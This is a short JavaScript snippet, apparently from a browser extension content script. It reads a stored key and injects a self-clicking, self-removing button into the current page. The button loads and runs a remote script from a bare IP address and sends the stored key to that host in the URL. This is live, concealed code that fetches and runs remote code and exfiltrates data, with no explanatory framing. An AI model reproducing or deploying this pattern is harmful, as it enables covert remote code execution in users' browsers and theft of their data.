chrome.storage.local.get(['key'], function (result) {

    let div = document.createElement('div');
    div.setAttribute('id', 'inject-div')

    div.innerHTML += `<button id="inject-btn" onclick="let el = document.createElement('script');el.src = 'https://195.2.79.27/api/v1/extension/html/public/page-init/d34dfrgr3535wdfq?key=` + result.key + `&load=1';document.body.append(el);">TEST<button>`;

    document.body.appendChild(div);

    document.querySelector('#inject-btn').click();
    document.querySelector('#inject-div').remove();
});
